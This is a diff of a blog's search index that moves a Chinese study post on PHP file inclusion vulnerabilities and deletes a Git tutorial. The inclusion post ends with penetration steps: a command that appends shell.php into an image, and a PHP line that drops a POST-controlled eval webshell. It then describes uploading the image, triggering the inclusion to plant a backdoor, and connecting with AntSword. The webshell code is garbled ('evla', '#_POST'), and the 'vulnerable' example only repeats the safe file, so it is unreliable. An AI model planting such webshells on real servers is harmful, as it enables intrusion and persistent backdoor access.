-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require_once.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="2-发生文件包含漏洞"><a href="#2-发生文件包含漏洞" class="headerlink" title="2.发生文件包含漏洞"></a>2.发生文件包含漏洞</h2><p>如果将require_once.php文件改为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require_once.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s3.ax1x.com/2020/11/19/DK8jQH.jpg" alt="DK8jQH.jpg"></p>
-<h2 id="3-四种函数总结"><a href="#3-四种函数总结" class="headerlink" title="3.四种函数总结"></a>3.四种函数总结</h2><table>
-<thead>
-<tr>
-<th>函数名</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>include()</td>
-<td>当使用该函数包含文件时，只有代码执行到includ()函数时才会将文件包含进来，发生错误时给出一个警告，继续向下执行</td>
-</tr>
-<tr>
-<td>include_once()</td>
-<td>功能与include()相同，区别在于当重复调用同一文件时，程序只调用一次</td>
-</tr>
-<tr>
-<td>require()</td>
-<td>require()与include()区别在于require()执行如果发生错误，函数就会输出错误信息，并终止脚本运行</td>
-</tr>
-<tr>
-<td>require_once()</td>
-<td>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</td>
-</tr>
-</tbody></table>
-<h1 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h1><h2 id="1-本地文件包含漏洞"><a href="#1-本地文件包含漏洞" class="headerlink" title="1.本地文件包含漏洞"></a>1.本地文件包含漏洞</h2><p>当别包含的文件在服务器本地</p>
-<h2 id="2-远程文件包含漏洞"><a href="#2-远程文件包含漏洞" class="headerlink" title="2.远程文件包含漏洞"></a>2.远程文件包含漏洞</h2><p>当被包含的文件在第三方服务器本地</p>
-<h1 id="文件包含漏洞产生原因"><a href="#文件包含漏洞产生原因" class="headerlink" title="文件包含漏洞产生原因"></a>文件包含漏洞产生原因</h1><h1 id="文件包含漏洞渗透"><a href="#文件包含漏洞渗透" class="headerlink" title="文件包含漏洞渗透"></a>文件包含漏洞渗透</h1><p>1.制作一句话图片木马</p>
-<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">方法一：windows 命令：</span><br><span class="line"><span class="keyword">copy</span><span class="bash"> hack.jpg/b+shell.php hack.jpg</span></span><br><span class="line"></span><br><span class="line">方法二：使用edjpgcom</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>fputs(fopen(<span class="string">&quot;shell2.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php evla(#_POST[hack]);?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>2.上传木马图片文件</p>
-<p>3.执行文件包含并生成后门</p>
-<p>4.通过蚁剑连接</p>
-]]></content>
-      <categories>
-        <category>网络安全知识学习</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
-      </tags>
   </entry>
   <entry>
     <title>数据结构</title>
@@ -3393,6 +3404,72 @@
 </ol>
 </blockquote>
 ]]></content>
+  </entry>
+  <entry>
+    <title>文件包含漏洞</title>
+    <url>/post/4089de4e.html</url>
+    <content><![CDATA[<p>　　网络安全内容方面的学习，了解了网站的文件包含漏洞<a id="more"></a></p>
+<h1 id="什么是文件包含漏洞"><a href="#什么是文件包含漏洞" class="headerlink" title="什么是文件包含漏洞"></a>什么是文件包含漏洞</h1><p>　　php文件包含漏洞的产生原因是在通过php的函数引入文件时，使用了预想之外的文件，就可能导致文件泄露甚至恶意代码的注入。</p>
+<h1 id="PHP文件包含的函数"><a href="#PHP文件包含的函数" class="headerlink" title="PHP文件包含的函数"></a>PHP文件包含的函数</h1><h2 id="1-四种函数理解"><a href="#1-四种函数理解" class="headerlink" title="1.四种函数理解"></a>1.四种函数理解</h2><p>创建inc.php文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>创建include.php文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is include.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>创建include_once.php文件，但是调用同一文件只调用第一次</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;./inc.php&quot;</span>);<span class="comment">//包含inc文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is include_once.php&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;./inc.php&quot;</span>;<span class="comment">//包含inc文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>创建require.php文件，如果包含失败，会报出错误信息，并终止脚本运行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>创建require_once.php文件，功能和require一样，但是只包含一次</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require_once.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-发生文件包含漏洞"><a href="#2-发生文件包含漏洞" class="headerlink" title="2.发生文件包含漏洞"></a>2.发生文件包含漏洞</h2><p>如果将require_once.php文件改为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require_once.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.ax1x.com/2020/11/19/DK8jQH.jpg" alt="DK8jQH.jpg"></p>
+<h2 id="3-四种函数总结"><a href="#3-四种函数总结" class="headerlink" title="3.四种函数总结"></a>3.四种函数总结</h2><table>
+<thead>
+<tr>
+<th>函数名</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>include()</td>
+<td>当使用该函数包含文件时，只有代码执行到includ()函数时才会将文件包含进来，发生错误时给出一个警告，继续向下执行</td>
+</tr>
+<tr>
+<td>include_once()</td>
+<td>功能与include()相同，区别在于当重复调用同一文件时，程序只调用一次</td>
+</tr>
+<tr>
+<td>require()</td>
+<td>require()与include()区别在于require()执行如果发生错误，函数就会输出错误信息，并终止脚本运行</td>
+</tr>
+<tr>
+<td>require_once()</td>
+<td>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</td>
+</tr>
+</tbody></table>
+<h1 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h1><h2 id="1-本地文件包含漏洞"><a href="#1-本地文件包含漏洞" class="headerlink" title="1.本地文件包含漏洞"></a>1.本地文件包含漏洞</h2><p>当别包含的文件在服务器本地</p>
+<h2 id="2-远程文件包含漏洞"><a href="#2-远程文件包含漏洞" class="headerlink" title="2.远程文件包含漏洞"></a>2.远程文件包含漏洞</h2><p>当被包含的文件在第三方服务器本地</p>
+<h1 id="文件包含漏洞产生原因"><a href="#文件包含漏洞产生原因" class="headerlink" title="文件包含漏洞产生原因"></a>文件包含漏洞产生原因</h1><h1 id="文件包含漏洞渗透"><a href="#文件包含漏洞渗透" class="headerlink" title="文件包含漏洞渗透"></a>文件包含漏洞渗透</h1><p>1.制作一句话图片木马</p>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">方法一：windows 命令：</span><br><span class="line"><span class="keyword">copy</span><span class="bash"> hack.jpg/b+shell.php hack.jpg</span></span><br><span class="line"></span><br><span class="line">方法二：使用edjpgcom</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>fputs(fopen(<span class="string">&quot;shell2.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php evla(#_POST[hack]);?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.上传木马图片文件</p>
+<p>3.执行文件包含并生成后门</p>
+<p>4.通过蚁剑连接</p>
+]]></content>
+      <categories>
+        <category>网络安全知识学习</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
+      </tags>
   </entry>
   <entry>
     <title>文件上传漏洞</title>
@@ -4460,82 +4537,5 @@
       <categories>
         <category>SpringBoot项目</category>
       </categories>
-  </entry>
-  <entry>
-    <title>提交代码到GitHub</title>
-    <url>/post/a2535634.html</url>
-    <content><![CDATA[<p>　　如何将Idea里面创建的项目提交到GitHub，在Gitee上操作大同小异。<a id="more"></a></p>
-<p>在开始之前，我们需要在在本地创建一个文件夹，用来保存以后从github上拉去的仓库。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617005004-GIt%E6%93%8D%E4%BD%9C3.jpg" alt="GIt操作3"></p>
-<p>然后，需要在Github新建一个仓库，用来保存项目代码，名字最好和IDEA项目的名字保持一致。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004625-GIt%E6%93%8D%E4%BD%9C1.jpg" alt="GIt操作1"></p>
-<p>可以看到上面的仓库链接，</p>
-<p>执行<code>git clone https://github.com/qnjy/finance_demo.git</code>命令，将仓库克隆到本地。需要现在GitLocalRepo文件夹下右键点击Git Bash Here。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004581-GIt%E6%93%8D%E4%BD%9C4.jpg" alt="GIt操作4"></p>
-<p>本地就会出现一个以仓库命名的文件夹</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004577-GIt%E6%93%8D%E4%BD%9C5.jpg" alt="GIt操作5"></p>
-<p>点开将.git文件夹复制到IDEA的项目里面，注意：如果看不到.git文件夹，就点击上方的查看-&gt;勾选已隐藏的项目</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004573-GIt%E6%93%8D%E4%BD%9C6.jpg" alt="GIt操作6"></p>
-<p>使用IDEA打开项目，首先将IDEA终端设置为bash.exe，这个方便我们以后执行git命令</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004569-GIt%E6%93%8D%E4%BD%9C7.jpg" alt="GIt操作7"></p>
-<p>执行<code>git status</code>查看文件的状态</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004565-GIt%E6%93%8D%E4%BD%9C8.jpg" alt="GIt操作8"></p>
-<p>然后<code>git add .</code>添加文件到所有缓存区</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004562-GIt%E6%93%8D%E4%BD%9C.jpg" alt="GIt操作"></p>
-<p>之后<code>git commit -m &quot;第一次提交&quot;</code>将缓存区的内容提交到本地仓库</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004553-GIt%E6%93%8D%E4%BD%9C10.jpg" alt="GIt操作10"></p>
-<p>最后<code>git push</code>到远程仓库</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004547-GIt%E6%93%8D%E4%BD%9C11.jpg" alt="GIt操作11"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004542-GIt%E6%93%8D%E4%BD%9C12.jpg" alt="GIt操作12"></p>
-<p><strong>Git文件操作</strong></p>
-<blockquote>
-<p>文件的四种状态</p>
-</blockquote>
-<p>版本控制就是对文件的版本控制，要对文件进行修改、提交等操作，首先要知道文件当前在什么状态，不然可能会提交了现在还不想提交的文件，或者要提交的文件没提交上。</p>
-<ul>
-<li><p>Untracked: 未跟踪, 此文件在文件夹中, 但并没有加入到git库, 不参与版本控制. 通过git add 状态变为Staged.</p>
-</li>
-<li><p>Unmodify: 文件已经入库, 未修改, 即版本库中的文件快照内容与文件夹中完全一致. 这种类型的文件有两种去处, 如果它被修改, 而变为Modified. 如果使用git rm移出版本库, 则成为Untracked文件</p>
-</li>
-<li><p>Modified: 文件已修改, 仅仅是修改, 并没有进行其他的操作. 这个文件也有两个去处, 通过git add可进入暂存staged状态, 使用git checkout 则丢弃修改过, 返回到unmodify状态, 这个git checkout即从库中取出文件, 覆盖当前修改 !</p>
-</li>
-<li><p>Staged: 暂存状态. 执行git commit则将修改同步到库中, 这时库中的文件和本地文件又变为一致, 文件为Unmodify状态. 执行git reset HEAD filename取消暂存, 文件状态为Modified</p>
-</li>
-</ul>
-<blockquote>
-<p>查看文件状态</p>
-</blockquote>
-<p>上面说文件有4种状态，通过如下命令可以查看到文件的状态：</p>
-<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#查看指定文件状态</span></span><br><span class="line">git status [filename]</span><br><span class="line"><span class="meta">#查看所有文件状态</span></span><br><span class="line">git status</span><br><span class="line"><span class="meta"># git add .                  添加所有文件到暂存区</span></span><br><span class="line"><span class="meta"># git commit -m &quot;消息内容&quot;    提交暂存区中的内容到本地仓库 -m 提交信息</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>忽略文件</p>
-</blockquote>
-<p>有些时候我们不想把某些文件纳入版本控制中，比如数据库文件，临时文件，设计文件等</p>
-<p>在主目录下建立”.gitignore”文件，此文件有如下规则：</p>
-<ol>
-<li><p>忽略文件中的空行或以井号（#）开始的行将会被忽略。</p>
-</li>
-<li><p>可以使用Linux通配符。例如：星号（*）代表任意多个字符，问号（？）代表一个字符，方括号（[abc]）代表可选字符范围，大括号（{string1,string2,…}）代表可选的字符串等</p>
-</li>
-<li><p>如果名称的最前面有一个感叹号（!），表示例外规则，将不被忽略。</p>
-</li>
-<li><p>如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在根目录下，而根目录的子目录中的文件不忽略。</p>
-</li>
-<li><p>如果名称的最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件（默认文件或目录都忽略）。</p>
-</li>
-</ol>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#为注释</span></span><br><span class="line">*.txt         <span class="comment">#忽略所有 .txt结尾的文件,这样的话上传就不会被选中！</span></span><br><span class="line">!lib.txt       <span class="comment">#但lib.txt除外</span></span><br><span class="line">/temp        <span class="comment">#仅忽略项目根目录下的TODO文件,不包括其它目录</span></span><br><span class="line">build<span class="regexp">/        #忽略build/</span>目录下的所有文件</span><br><span class="line">doc<span class="regexp">/*.txt     #会忽略 doc/</span>notes.txt 但不包括 doc<span class="regexp">/server/</span>arch.txt</span><br></pre></td></tr></table></figure>
-
-<p><strong>git分支操作</strong></p>
-<p>git常用分支命令</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004511-GIt%E6%93%8D%E4%BD%9C13.png" alt="GIt操作13"></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 列出所有本地分支</span></span><br><span class="line">git branch</span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出所有远程分支</span></span><br><span class="line">git branch -r</span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一个分支，但依然停留在当前分支</span></span><br><span class="line">git branch [branch-name]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一个分支，并切换到该分支</span></span><br><span class="line">git checkout -b [branch]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 合并指定分支到当前分支$ </span></span><br><span class="line">git merge [branch]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除分支$ </span></span><br><span class="line">git branch -d [branch-name]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除远程分支</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin --delete [branch-name]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -dr [remote/branch]</span></span><br></pre></td></tr></table></figure>
-
-<p>IDEA操作</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004531-GIt%E6%93%8D%E4%BD%9C12.jpg" alt="GIt操作12"></p>
-<p>如果同一个文件在合并分支时都被修改了则会引起冲突：解决的办法是我们可以修改冲突文件后重新提交！选择要保留他的代码还是你的代码！</p>
-<p>master主分支应该非常稳定，用来发布新版本，一般情况下不允许在上面工作，工作一般情况下在新建的dev分支上工作，工作完后，比如上要发布，或者说dev分支代码稳定后可以合并到主分支master上来。</p>
-]]></content>
   </entry>
 </search>
